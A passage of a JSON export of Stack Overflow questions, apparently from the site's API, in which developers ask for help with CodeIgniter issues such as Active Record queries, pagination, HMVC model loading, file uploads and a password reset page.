WYSIWYG Editor(no max set)\n(could be as many as 20 or so text&amp;textfield's)</p>\n\n<p><strong>My Question is:</strong> What is a proper way to set up my database to handle the user generated content(should I make 20 columns for text or something other)? And in what form should I send it to the database(just lump it all into an array and send it to database or what)? And should I limit how much text can be in each textfield?</p>\n\n<p>Using: Using phpMyAdmin\nAlso using CodeIgniter as my php framework</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12113410,"title":"Dropdown filter not working","body":"<p>I saw a filter example here on Stackoverflow and I'd try to implement it on my codeigniter but it doesn't filter it when I click the go button. It returns me always <code>no user found</code> what is the problem with this?</p>\n\n<p>Controller</p>\n\n<pre><code>public function filter($page=0,$offset=5,$search=''){\n\n        $user = $this-&gt;session-&gt;userdata('user_id');\n        $position = $this-&gt;session-&gt;userdata('user_position');\n\n\n\n        if($position =='admin'){\n\n            $search = $this-&gt;input-&gt;post('search');\n            $row = $this-&gt;m_user-&gt;getAllFilterUsers($offset,$page,$search);\n            $data['usersTable'] = $row-&gt;result();\n            $data['pagination'] = $this-&gt;m_user-&gt;getUsersFilterPages($search);\n            $data['offset'] = $offset;\n            $data['page'] = $page;\n            $data['search'] = $search;\n            $data['title'] = 'Manage Users';\n            $this-&gt;load-&gt;view('vadminuserfilter',$data);\n\n\n        }\n        else{\n            $this-&gt;session-&gt;set_flashdata('error','Page Not Found.');\n            redirect('cuser/displayClientPage');\n            return;\n        }\n\n\n\n    }\n</code></pre>\n\n<p>Model</p>\n\n<pre><code>    public function getAllFilterUsers($offset,$count,$search){\n\n        if($search!=''){\n            $this-&gt;db-&gt;where('user_position','client');\n            $this-&gt;db-&gt;where('user_status',$search);\n        }\n                        $this-&gt;db-&gt;where('user_position','client');\n                        $this-&gt;db-&gt;where('user_status','active');\n                        $this-&gt;db-&gt;order_by('user_id', 'desc'); \n          $UsersQuery = $this-&gt;db-&gt;get('tb_user',$offset,$count);\n\n            if($UsersQuery-&gt;num_rows&gt;0){\n                return $UsersQuery;\n            }\n\n            else{\n\n\n\n                $this-&gt;session-&gt;set_flashdata('message','No User Found');   \n                redirect('cuser/filter','refresh');\n            }           \n    }\n\n\n    public function getUsersFilterPages($search){\n\n        $this-&gt;db-&gt;where('user_position','client');\n        $this-&gt;db-&gt;where('user_status',$search);\n        $Pagesquery = $this-&gt;db-&gt;get('tb_user');\n            $config['base_url'] = site_url('cuser/filter');\n            $config['total_rows']= $Pagesquery-&gt;num_rows();\n            $config['per_page'] = 5;\n\n            $config['first_link'] = 'First'; \n            $config['prev_link'] = 'Previous';\n            $config['next_link'] = 'Next';\n            $config['last_link'] = 'Last';  \n            $this-&gt;pagination-&gt;initialize($config);\n\n\n    return $this-&gt;pagination-&gt;create_links();   \n\n    }   \n</code></pre>\n\n<p>View</p>\n\n<pre><code>&lt;?php echo form_open('cuser/filter'); ?&gt;\nFilter By:\n&lt;?php $dropdown = array('active'=&gt;'active','inactive'=&gt;'inactive');?&gt;\n&lt;?php echo form_dropdown('search', $dropdown); ?&gt; \n &lt;input name=\"Submit\" type=\"submit\" class=\"button\" &lt;?php echo form_submit('submit','Go');?&gt;\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12647784,"title":"Codeigniter form URI loses segment when failing validation","body":"<p>Using codeigniter 2.1.2, I have a form view loaded through a controller that takes a parameter. This parameter is a boolean that tells the view whether to render certain content on the form. </p>\n\n<p>the URI of the standard form is: <code>ordering/create/</code>\nbut if the form should be rendering as a 'holiday' form is: <code>ordering/create/holiday</code></p>\n\n<p>If the submitted form does not pass validation, the standard form is always shown. How do I get the last segment to persist through validation and form re-population?</p>\n\n<p>Here is my controller function.</p>\n\n<pre><code>public function create($holiday = NULL)\n{\n    $data['holiday'] = ($holiday != NULL) ? TRUE : FALSE;\n\n    //load the code igniter helpers we'll be using\n    $this-&gt;load-&gt;helper('form');\n    $this-&gt;load-&gt;library('form_validation');\n\n    //set the page title\n    $data['title'] = 'Create an Order';\n\n    //validate the form input\n    $this-&gt;form_validation-&gt;set_rules('firstName','First Name','required');\n    $this-&gt;form_validation-&gt;set_rules('lastName','Last Name','required');\n    $this-&gt;form_validation-&gt;set_rules('phoneNumber','Phone Number','required|callback_validate_phoneNumber');\n    $this-&gt;form_validation-&gt;set_rules('emailAddress','Email Address','required|valid_email');               \n    $this-&gt;form_validation-&gt;set_rules('pickupDate','Pickup Date','required|callback_validate_pickupDate');\n    $this-&gt;form_validation-&gt;set_rules('pickupTime','Pickup Time','required');\n\n    //check that at least one product was selected\n    $this-&gt;load-&gt;model('products_model');\n    $data['products'] = $this-&gt;products_model-&gt;get_online_products($data['holiday']);\n    $productSelections = array();\n    $totalProducts = 0;\n    foreach($data['products']-&gt;result() as $product)\n    {\n        $productSelections[$product-&gt;productProductSizeId] = $this-&gt;input-&gt;post('product_'.$product-&gt;productProductSizeId);\n        $totalProducts += $productSelections[$product-&gt;productProductSizeId];\n    }\n\n    $pickupDate = new DateTime($this-&gt;input-&gt;post('pickupDate'));\n\n    //if the form failed validation, or there is no form data yet, send the user back to the form\n    if($this-&gt;form_validation-&gt;run() === FALSE || $totalProducts == 0)\n    {\n        $this-&gt;load-&gt;model('calendar_model');\n        $data['calendarRules'] = $this-&gt;calendar_model-&gt;get_rules($data['holiday']);\n\n        $data['productSelections'] = $productSelections;\n\n        if($this-&gt;form_validation-&gt;run() === TRUE &amp;&amp; $totalProducts == 0)\n        {\n            $data['productsError'] = 'You must order at least one product';\n        }\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('ordering/create', $data);\n        $this-&gt;load-&gt;view('templates/footer');\n    }\n    else\n    {\n        //save the data to the DB\n        $savedData = $this-&gt;ordering_model-&gt;create_order($data['holiday']);\n\n        //send the confirmation email and redirect to the confirmation page\n        $this-&gt;send_confirmation($savedData['orderHeader']['orderId']);\n    }\n}\n</code></pre>\n"},{"tags":["sql","database","query","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12653023,"title":"SQL statement - how do I do this in active record?","body":"<p>I am struggling to create an active record statement to do what I want, here is my current attempt:</p>\n\n<pre><code>$this-&gt;db\n            -&gt;select('*')\n            -&gt;from('item_entries')\n            -&gt;where('is_pick', 'y')\n            -&gt;join('item_categories_rel', 'item_categories_rel.item_id = item_entries.item_id')\n            -&gt;join('item_categories', 'item_categories.cat_id = item_categories_rel.cat_id')\n            -&gt;join('ratings_total', 'ratings_total.item_id = item_entries.item_id')\n            -&gt;where('item_categories.cat_id', $cat_id)\n            -&gt;or_where('parent_id', $cat_id)\n            -&gt;or_where('gparent_id', $cat_id)\n            -&gt;order_by(\"item_name\", \"desc\");  \n        $query2 = $this-&gt;db-&gt;get();\n        if(is_object($query)){return $query2-&gt;result_array();}else{return $query2;}\n</code></pre>\n\n<p>This translates to the following sql:</p>\n\n<pre><code>SELECT *\nFROM (`item_entries`)\nJOIN `item_categories_rel` ON `item_categories_rel`.`item_id` = `item_entries`.`item_id`\nJOIN `item_categories` ON `item_categories`.`cat_id` = `item_categories_rel`.`cat_id`\nJOIN `ratings_total` ON `ratings_total`.`item_id` = `item_entries`.`item_id`\nWHERE `is_pick` =  'y'\nAND `item_categories`.`cat_id` =  '3'\nOR `parent_id` =  '3'\nOR `gparent_id` =  '3'\n</code></pre>\n\n<p>Now, what I want (although I am aware I cant do temp tables in active record) is the equivalent of this:</p>\n\n<pre><code>SELECT *\nFROM (\n    SELECT *\n    FROM (`item_entries`)\n    JOIN `item_categories_rel` ON `item_categories_rel`.`item_id` = `item_entries`.`item_id`\n    JOIN `item_categories` ON `item_categories`.`cat_id` = `item_categories_rel`.`cat_id`\n    JOIN `ratings_total` ON `ratings_total`.`item_id` = `item_entries`.`item_id`\n    WHERE `is_pick` =  'y'\n    AS T\n)\nWHERE `item_categories`.`cat_id` =  '3'\nOR `parent_id` =  '3'\nOR `gparent_id` =  '3'\n</code></pre>\n\n<p>How can retrieve this result in active record?</p>\n\n<p>Please note - I have not checked the above SQL so it may be slightly wrong but hopefully you get what I am trying to do.</p>\n"},{"tags":["codeigniter","codeigniter-2","codeigniter-datamapper","question2answer"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12651757,"title":"codeigniter active record class","body":"<p><strong>this is my normal mysql command</strong></p>\n\n<pre><code>$query = $this-&gt;db-&gt;query(\"SELECT `house_details`.`houses_id` , `house_details`.`house_dis` ,  `house_details`.`house_type` , `house_details`.`area` , `house_details`.`cost` , `house_details`.`user_id` , `image`.`thumb_path`\nFROM (\n`house_details`\n)\nLEFT JOIN `image` ON `image`.`house_id` = `house_details`.`houses_id`\nAND `house_details`.`status` =1\nGROUP BY `houses_id` DESC\nLIMIT $start,$limit \");     \n\nreturn $query-&gt;result();\n</code></pre>\n\n<h3>what is the similar code with CI active record class ??</h3>\n"},{"tags":["codeigniter","exception","facebook-php-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12651943,"title":"Codeigniter hiding errors from libraries. Why?","body":"<p>So I has a small problem as I outlined <a href=\"http://stackoverflow.com/questions/12646394/facebook-sdk-breaking-codeigniter-blank-page\">here.</a></p>\n\n<p>I have made a new question because this is more general and will perhaps help others.</p>\n\n<p>So essentially, I integrated the Facebook SDK Into Codeigniter as a library.</p>\n\n<p>The SDK requires Json and Curl.</p>\n\n<p>In the base_facebook.php file there is the following code:</p>\n\n<pre><code>    if (!function_exists('curl_init')) {\n  throw new Exception('Facebook needs the CURL PHP extension.');\n}\nif (!function_exists('json_decode')) {\n  throw new Exception('Facebook needs the JSON PHP extension.');\n}\n</code></pre>\n\n<p>If these functions are not available I expect an error to be fired to tell me such. Then I can install the correct packages and continue.</p>\n\n<p>What actually happened is that even when I had error reporting set to E_ALL a blank page was returned.</p>\n\n<p>This made it impossible to debug and after lots of playing I worked out it was because CURL was not installed on my server.</p>\n\n<p>My question is why does codeigniter show blank pages rather than library based exceptions?\nFurthermore even if there is an exception in a library why does the rest of the page not continue executing.\nEssentially CI is seemingly making the use of exceptions worthless..</p>\n\n<p>COuld anyone advise?</p>\n\n<p>THanks</p>\n"},{"tags":["forms","codeigniter","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12653589,"title":"Remove index.php from URL (CodeIgniter)","body":"<p>I've removed the index.php throught this code:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|assets|robots\\.txt)\nRewriteRule ^(.*)$ /leet/index.php/$1 [L]\n</code></pre>\n\n<p>But when I submit form <code>&lt;?=form_open('signup');?&gt;</code> and the page refreshes the url changes its value to <code>localhost/ci/index.php/signup</code>.</p>\n\n<p>Is it possible to remove it?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12652446,"title":"Codeigniter - stop direct access to a page","body":"<p>I'm building a password reset page, on the finishing steps of this action the user inputs his password and confirms it by inputting the password again, the 2 inputs are compared, if these inputs are equal the password is changed, if not, the user is directed to a page with a \"no success message\".</p>\n\n<p>Here is my logic:</p>\n\n<p>On the password reset page:</p>\n\n<p><strong>echo form_open(\"login/password_reseter\");</strong></p>\n\n<p>My <strong>controller:</strong></p>\n\n<pre><code>   function password_reseter() {\n        $password1 = $this-&gt;input-&gt;post('password');\n        $password2 = $this-&gt;input-&gt;post('password2');\n        if ($password1 == $password2) {\n            $data[\"proof\"]=1;\n            $reg_code = $this-&gt;input-&gt;post('rec_code');\n            $this-&gt;load-&gt;model(\"membership_model\");\n            $this-&gt;membership_model-&gt;password_reseter($reg_code, $password2);\n        }\n        else{\n            $data[\"proof\"]=0;\n        }\n\n        $data[\"main_content\"] = \"reset_password_result\";\n        $this-&gt;load-&gt;view(\"includes/template\", $data);\n    }\n</code></pre>\n\n<p>And the <strong>view</strong>:</p>\n\n<pre><code>&lt;?php\nif ($proof == 1) {\n    ?&gt;\n    &lt;div id=\"loginform\"&gt;\n        Your password has been changed, you may now login.\n    &lt;/div&gt;\n    &lt;?php\n} else {\n    ?&gt;\n    &lt;div id=\"loginform\"&gt;\n        Your passwords don't match! &lt;a href=\"javascript:history.back()\"&gt;Go back.&lt;/a&gt;\n    &lt;/div&gt;\n    &lt;?php\n}\n?&gt;\n</code></pre>\n\n<p>I have a big security issue though, if this page is accessed directly by URL, all the accounts on my database are getting their password reset, I'd like to stop direct access to this password_reseter page. </p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12607656,"title":"Why I can't load models in modules?! [Using HMVC in codeigniter 2.1.2]","body":"<p>I hope someone can help me with this one before I jump off the window. I spent few hours on this one and don't know what am I doing wrong. </p>\n\n<p>Basically, I've installed HMVC in CodeIgniter 2.1.2 and everything works fine, BUT for some reason I can't load models the same way I'm doing it in standard controllers. In the old codeigniter 1.7.1 I could use it simply by invoking $this->load->model('my_model') but now I can't?!</p>\n\n<p>Every single time I'm trying to load model I get this error:</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Notice\nMessage: Undefined property: Special_cart::$db\nFilename: core/Model.php\nLine Number: 51\n</code></pre>\n\n<p>I have had installed it step-by-step according to the instructions. I got third_party next to modules folder. In modules I have few modules stored like this:</p>\n\n<pre><code>modules\n--boxes\n----controller\n----models\n----views\n</code></pre>\n\n<p>I invoke module in my code like this:</p>\n\n<pre><code>&lt;?=modules::run('boxes/special_cart/index');?&gt;\n</code></pre>\n\n<p>My module controller code looks like this:</p>\n\n<pre><code>class Special_cart extends CI_Controller\n{\n    public function __construct()\n    {\n        parent::__construct();\n\n    }   \n\n\n\n\n\n    public function index()\n    {\n        if ($this-&gt;session-&gt;userdata('cart'))\n        {\n            # get product id's and each quantity\n\n            $cart_product_list = array_count_values($this-&gt;session-&gt;userdata('cart'));\n\n            # get list of product_id\n            $product_list = array_keys($cart_product_list); \n\n            # get product details\n            $this-&gt;load-&gt;model('productmodel');\n            $this-&gt;load-&gt;model('stockmodel');\n\n            $cart_products = $this-&gt;productmodel-&gt;cart_get_products_details($product_list);\n            $final_cart_array = array();\n\n            foreach($cart_products as $cart_product){\n                $product_stock = $this-&gt;stockmodel-&gt;view_product_stock($cart_product[\"id\"]);\n                if(empty($product_stock) || $product_stock[\"UNITS\"]&lt;=0)\n                    $cart_product[\"UNITS\"] = 0;\n                else{\n                    if($cart_product_list[$cart_product[\"id_web\"]]&gt;$product_stock[\"UNITS\"])\n                        $cart_product[\"UNITS\"] = $product_stock[\"UNITS\"];\n                    else{\n                        $cart_product[\"UNITS\"] = $cart_product_list[$cart_product[\"id_web\"]];\n                    }\n                }\n                $final_cart_array[] = $cart_product;\n\n            }\n\n            $refresh_cart_array = array();\n\n\n            foreach($final_cart_array as $cart_product){\n\n                for($i=1;$i&lt;=$cart_product[\"UNITS\"];$i++){\n                    $refresh_cart_array[] = $cart_product[\"id_web\"];\n                }\n\n            }\n\n\n            $this-&gt;load-&gt;view(\"special_cart\",array(\n                                                'refresh_cart_array'        =&gt; $refresh_cart_array,\n                                                'final_cart_array' =&gt; $final_cart_array\n                                                ));\n\n\n\n\n\n                } else {\n                $this-&gt;load-&gt;view(\"special_cart\",array(\n                                                    'refresh_cart_array'        =&gt; NULL,\n                                                    'final_cart_array' =&gt; NULL\n                                                    ));\n\n                    }\n            }   \n\n}\n</code></pre>\n\n<p>I've tried every possible solution found on internet - none of them work.... \nI hope you understand my problem but in case you need some further explanation please ask me. Can anyone help?</p>\n"},{"tags":["php","oracle","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12651446,"title":"How to execute a stored procedure in Codeigniter with the Oracle Driver?","body":"<p>How to execute a stored procedure in Codeigniter with the Oracle Driver ?\nI have Oracle 10g and Codeigniter 2.1.2 .</p>\n"},{"tags":["database","facebook","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":89,"score":-1,"question_id":12622177,"title":"Facebook connect login with data saving in database","body":"<p>I am having problems with facebook connect in my codeigniter site that is i am not able to save data into my database that i am getting from facebook login.</p>\n\n<p>Facebook login is working fine.\nI used this <a href=\"http://www.idiotminds.com/login-with-facebook-using-php-sdk/\" rel=\"nofollow\">tutorial</a> </p>\n\n<p>Can anyone please provise me with the tutorial that can help me in saving data into my database.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12650346,"title":"Need to assign dynamically $config['base_url'] in codeigniter?","body":"<p>I need to assign <code>$config['base_url']</code> dynamically in <code>config.php</code> every time when url hits.</p>\n\n<p>Is there any solution for this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1479,"score":1,"question_id":7863027,"title":"Codeigniter: How to upload files path to database?","body":"<p>I am trying to put the file path to database, I already uploaded the file but I don't know how to get the path of the file to put it in the database?</p>\n\n<p>Here is the controller:</p>\n\n<pre><code>    &lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass dogo extends CI_Controller {\n\n    function __construct() {\n        parent::__construct();\n        $this-&gt;load-&gt;model('insert_article');\n    }   \n    public function index()\n    {\n\n    $this-&gt;load-&gt;view('dogo/dashboard.php');\n\n    }\n    //add new post to database including uploading image\n    public function new_post()\n    {\n\n    //used for the dropdown menu (category)\n    $this-&gt;load-&gt;model('dogo_cat');\n    $data['categores_dropdown'] = $this-&gt;dogo_cat-&gt;get_categories();    \n\n    //form validation\n    $this-&gt;load-&gt;library('form_validation');//load the validation library\n\n    $this-&gt;form_validation-&gt;set_rules('title', 'title of the post', 'required');\n    $this-&gt;form_validation-&gt;set_rules('text', 'text of the post', 'required');\n    //$this-&gt;form_validation-&gt;set_rules('image', 'image of the post', 'required');\n    $this-&gt;form_validation-&gt;set_rules('category', 'category of the post', 'required');  \n\n    //the form validation condition\n    if($this-&gt;form_validation-&gt;run() == FALSE){\n        //error\n        //$this-&gt;view_data\n        $this-&gt;load-&gt;view('dogo/new_post.php', $data);      \n    }else{\n\n        //no error in the form\n        $title = $this-&gt;input-&gt;post('title');\n        $text = $this-&gt;input-&gt;post('text');\n        $category = $this-&gt;input-&gt;post('category');\n        $publish = $this-&gt;input-&gt;post('publish');\n        //$img_nw = $this-&gt;input-&gt;post('img_nw');\n        //$img_nw = $this-&gt;input-&gt;post('img_nw');\n        $image_file = $this-&gt;input-&gt;post('image_file');\n\n\n\n        //uploading\n        $this-&gt;load-&gt;model('upload_new_post');\n        if($this-&gt;input-&gt;post('upload')){\n        $this-&gt;upload_new_post-&gt;do_upload();\n\n        //$this-&gt;insert_article-&gt;insert_new_post($title, $category, $img_nw, $text, $source, $publish);\n\n        $data['images'] = $this-&gt;upload_new_post-&gt;get_images();\n\n        echo \"title of the post: \" . $title . \"&lt;br /&gt; and the text of the post \" . $text . \"&lt;br /&gt; and category is: \" . $category . \"&lt;br /&gt; and publish is: \" .$publish . \"&lt;br /&gt; and image: &lt;pre&gt;\" . $do_upload .\"&lt;/pre&gt;\";\n\n\n\n\n            //echo $img_nw;\n\n\n            $this-&gt;load-&gt;view('dogo/new_post.php', $data);              \n\n\n        }\n\n\n\n    }\n\n\n\n\n\n\n    }   \n}\n</code></pre>\n\n<p>And here is the model to upload it:</p>\n\n<pre><code>    &lt;?php\nclass upload_new_post extends CI_Model{\n    // retreive categories \n    var $file_path;\n    var $file_path_url;\n\n        function __construct() {\n        parent::__construct();\n            $this-&gt;file_path = realpath(APPPATH . '../post_data/images');\n            $this-&gt;file_path_url = base_url().'post_data/images/';\n    }\n\n    function do_upload(){\n        $config=array(\n        'allowed_types' =&gt; 'jpg|jpeg|gif|png',\n        'upload_path' =&gt; $this-&gt;file_path,\n        'max_size' =&gt; 2000 \n        );\n\n\n        $this-&gt;load-&gt;library('upload', $config);\n        $this-&gt;upload-&gt;do_upload();\n\n        $image_data = $this-&gt;upload-&gt;data();\n\n        $config = array(\n            'source_image' =&gt; $image_data['full_path'],\n            'new_image' =&gt; $this-&gt;file_path . '/thumbs',\n            'maintain_ration' =&gt; true,\n            'width' =&gt; 150,\n            'height' =&gt; 150\n        );\n\n        $this-&gt;load-&gt;library('image_lib', $config);\n        $this-&gt;image_lib-&gt;resize();\n    }\n\n    function get_images(){\n        $files = scandir($this-&gt;file_path);\n        $files = array_diff($files, array('.', '..', 'thumbs'));\n\n        $images = array();\n\n        foreach ($files as $file){\n            $images [] = array(\n                'url' =&gt; $this-&gt;file_path_url . $file,\n                'thumb_url' =&gt; $this-&gt;file_path_url . 'thumbs/' .$file\n            );\n\n        }\n        return $images;\n    }\n\n}       \n</code></pre>\n\n<p>And here the model to insert query:</p>\n\n<pre><code>    &lt;?php\nclass Insert_article extends CI_Model{\n\n    //insert new post\n    function __construct() {\n        parent::__construct();\n    }   \n\n    function insert_new_post($title, $category, $img_nw, $text, $source, $publish)\n    {\n        $query_insert = \"INSERT INTO hs_news_nw (idcat_nw, idsc_nw, idusr_nw, title_nw, img_nw, text_nw, active_nw, totalview_nw, date_nw) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)\";\n        $this-&gt;db-&gt;query($query_insert, array($category, $source, 1, $title, $img_nw, $text, 1, 1000, '2011-10-12 02:01:24'));\n    }\n}       \n</code></pre>\n"},{"tags":["codeigniter","url","post","edit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12647692,"title":"Codeigniter - change url at method call","body":"<p>I was wondering if the following can be done in codeigniter.</p>\n\n<p>Let's assume I have a file, called Post.php, used to manage posts in an admin interface.\nIt has several methods, such as index (lists all posts), add, update, delete...\nNow, I access the add method, so that the url becomes</p>\n\n<p>/posts/add</p>\n\n<p>And I add some data. I click \"save\" to add the new post. It calls the same method with an if statement like \"if \"this->input->post('addnew')\"\" is passed, call the model, add it to the database</p>\n\n<p>Here follows the problem:\nIf everything worked fine, it goes to the index with the list of all posts, and displays a confirmation</p>\n\n<p>BUT</p>\n\n<p>No the url would still be posts/add, since I called the function like $this->index() after verifying data was added. I cannot redirect it to \"posts/\" since in that case no confirmation message would be shown!</p>\n\n<p>So my question is: can i call a method from anther one in the same class, and have the url set to that method (/posts/index instead of /posts/add)?</p>\n\n<p>It's kinda confusing, but i hope i gave you enough info to spot the problem</p>\n\n<p>Cheers!</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12647623,"title":"str_replace in model or the view?","body":"<h1>Model</h1>\n\n<pre><code>function Show_all_products()\n{\n   return $this-&gt;db-&gt;get('printer')-&gt;result();\n}\n</code></pre>\n\n<h1>View</h1>\n\n<p>The table contents is being echoed in a loop</p>\n\n<pre><code> $i = -1;\n echo '&lt;ul class=\"products\"&gt;'; foreach($products as $product) : \n if($i % 11 == 10) echo '&lt;/ul&gt;&lt;ul class=\"products\"&gt;'; \n?&gt;\n\n&lt;li&gt;&lt;a href=\"&lt;?php echo base_url(); ?&gt;does/products/&lt;?php echo $product-&gt;id; echo '/'.$product-&gt;name; ?&gt;\"&gt;&lt;?php echo $product-&gt;name; ?&gt; &lt;/a&gt;&lt;/li&gt;\n\n&lt;?php \n $i += 1;\n endforeach; \n echo \"&lt;/ul&gt;\";\n</code></pre>\n\n<p>The product names are saved as <code>Something_Something_Blah</code> I cannot modify the product names as they are configured to show clean URL's and Breadcrumbs.</p>\n\n<p>The issue is that the links in this view show as <code>Something_Something_Blah</code></p>\n\n<p>I tried to do a <code>str_replace</code> as <code>$product = str_replace('_',' ', $product);</code> However this isn't working.</p>\n\n<p>How do i strip the '_' and insert <code>\\s</code>?</p>\n"},{"tags":["php","mysql","codeigniter","activerecord"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":45,"score":0,"question_id":12634914,"title":"codeigniter , mysql","body":"<p>I'm new to CI and I'm having a problem with MySQL</p>\n\n<p><strong>Table1</strong></p>\n\n<pre><code>id | house_id | \n1  |  1       | \n2  |  4       | \n3  |  3       | \n</code></pre>\n\n<p><strong>Table2</strong></p>\n\n<pre><code>house_id | image_name | \n4        |  a.jpg     | \n4        |  b.jpg     | \n3        |  c.jpg     | \n</code></pre>\n\n<p>How I can select (distinctively) <code>image_name</code> for each <code>house_id</code> by using CodeIgniter Active Record class?</p>\n"},{"tags":["codeigniter","templates"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12637533,"title":"codeigniter dynamic data template","body":"<p>I have this template view at view/include</p>\n\n<pre><code>&lt;?php $this-&gt;load-&gt;view('include/header'); ?&gt;\n&lt;?php $this-&gt;load-&gt;view($sidebar_column); ?&gt;\n&lt;?php $this-&gt;load-&gt;view($result_column); ?&gt;\n&lt;?php $this-&gt;load-&gt;view($footer_row); ?&gt;\n&lt;?php $this-&gt;load-&gt;view('include/footer'); ?&gt;\n</code></pre>\n\n<p>and i have the footer_row html at  view/include</p>\n\n<pre><code>&lt;div&gt; this is footer row &lt;?php echo $username ?&gt;&lt;/div&gt;\n</code></pre>\n\n<p>then i call the footer_row in my controller</p>\n\n<pre><code>$data['footer_row'] = 'include/footer_row';\n$this-&gt;load-&gt;view('include/template',$data);\n</code></pre>\n\n<p>My question, the footer_row is logged in user info and it appear in EVERY pages. With the above method I use, I have to call and retrieve the user info in every controller. How can i make it reusable so i don't need to repeat myself.</p>\n"},{"tags":["php","oop","mvc","codeigniter","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12642194,"title":"Drivers vs Controllers (MVC)","body":"<p>I am working with Codeignitor 2.x and I was originally using controllers as modules (though not completely HMVC), in that I had a Top Level controller that would call other lower level controllers.  My thinking was that because these lower level controllers were still interacting with the view, that they should remain controllers rather than models or drivers.</p>\n\n<p>What I found, however, is that each instance of a controller also spawns a new instance of CI.  So I would have 3 or 4 instances of CI running for each request.  Ton of overhead, and also caused session issues.</p>\n\n<p>I have since moved these lower level controllers into the library as drivers.  They now capture the CI instance in the construct method, and make modifications to it.  This makes it VERY nice to work with, and doesn't require the HMVC extension.  The drivers are not externally callable either, so it allows me to funnel all requests through specific entry points.</p>\n\n<p><strong>My question is whether this is structurally correct.</strong>  I have always held the notion that drivers should only modify the data they are provided through their method calls, but many of these drivers will pull information directly from GET and POST, and while they will not directly append to the View, they are often accessing view files, and passing the processed view to the CI instance for output.</p>\n\n<p>[EDIT] <em>A little more context:</em>\nOne of the drivers I have created is essentially a user login driver called 'Access'.  It makes calls to the 'User' model for create/login/logout methods.  The driver uses the POST data to check the User model, then loads the correct view with errors and whatever is needed.  The idea, being, with 2 lines, I can include this driver in any controller throughout the project, so there is a significant decrease in code redundancy.  Again, I know that the drivers should be confined to their scope, however the driver does not modify anything outside it's scope, but simply returns the view it has created.</p>\n\n<p>Is there another method to for doing this that is more inline with straight MVC?</p>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":395,"score":0,"question_id":10439013,"title":"In Codeigniter Pagination's generated page links, page 1 is always selected","body":"<p>I'm about to pull my hair over this!</p>\n\n<p>On initial load of my page with pagination (by CI), all rows are displayed, even if I only want 3. On click of other pages, however, it works fine (the correct rows are displayed), but Page 1 is always \"selected\" (not clickable), even if I click on Page 2, 3, etc.</p>\n\n<p>Any ideas?</p>\n\n<p>My <strong>CONTROLLER</strong>:</p>\n\n<pre><code>function album($type, $album_id, $album_name) {\n\n    $this-&gt;load-&gt;library('pagination');\n    $config['base_url'] = base_url(\"photo_store/album/$type/$album_id/$album_name/\");\n    $config['total_rows'] = $this-&gt;Media_model-&gt;get_photos($album_id, 'display_date DESC', NULL, NULL, TRUE);\n    $config['per_page'] = 3;\n    $this-&gt;pagination-&gt;initialize($config);\n    $album_photos = $this-&gt;Media_model-&gt;get_photos($album_id, 'display_date DESC', $config['per_page'], $this-&gt;uri-&gt;segment(6), FALSE);\n\n    $this-&gt;_load_view(array(\n        /* some other variables here */\n        'album_photos' =&gt; $album_photos\n    ));\n\n)\n\nprivate function _load_view($more_data) {\n    $data = array_merge($more_data, array( /* some other variables here */ ));\n    $this-&gt;load-&gt;view('template', $data);\n}\n</code></pre>\n\n<p>My <strong>MODEL</strong>:</p>\n\n<pre><code>public function get_photos($album_id=NULL, $order_by='display_date DESC', $limit=NULL, $offset=NULL, $count=FALSE) {\n\n    $result = array();\n    $query = $this-&gt;db-&gt;select('medium.*')-&gt;join('medium', \"$this-&gt;item.medium_id = medium.id\", 'inner')-&gt;order_by($order_by);\n    $limit = $limit ? $limit : '0';\n    $offset = $offset ? $offset : '0';\n    if ($limit!=='0' &amp;&amp; $offset!=='0') {\n        $query-&gt;limit($limit, $offset);\n    }\n\n    if ($album_id) { $result = $query-&gt;get_where($this-&gt;item, array('album_id' =&gt; $album_id)); }\n    else { $result = $query-&gt;get($this-&gt;item); }\n\n    if ($count){ return $result-&gt;num_rows(); }\n    else { return $result-&gt;result(); }\n\n}\n</code></pre>\n\n<p>My <strong>VIEW</strong>:</p>\n\n<pre><code>foreach ($album_photos as $photo) {\n    //display photos here\n}\necho 